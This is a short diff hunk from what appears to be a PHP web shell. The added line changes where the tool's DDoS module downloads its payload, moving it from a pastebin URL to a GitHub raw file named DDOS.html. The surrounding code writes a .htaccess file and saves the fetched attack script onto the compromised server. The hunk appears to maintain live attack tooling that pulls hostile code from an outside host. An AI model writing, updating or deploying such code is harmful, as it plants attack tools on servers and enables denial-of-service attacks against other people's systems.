@@ -3709,7 +3709,7 @@ Your IP: <font color="Lavender"><b><?php echo $ip; ?></b></font>�(Don't DoS yo
 	$htddos = fopen(".htaccess", "w");
 	fwrite($htddos, $isi_htddos);
 	fclose($htddos);		
-	$ddos_script = getsource("http://pastebin.com/raw/kj74yBD1");
+	$ddos_script = getsource("https://raw.githubusercontent.com/alxwahid/3voScript/master/DDOS.html");
 	$ddos = fopen($file_ddos, "w");
 	fwrite($ddos, $ddos_script);
 	fclose($ddos);
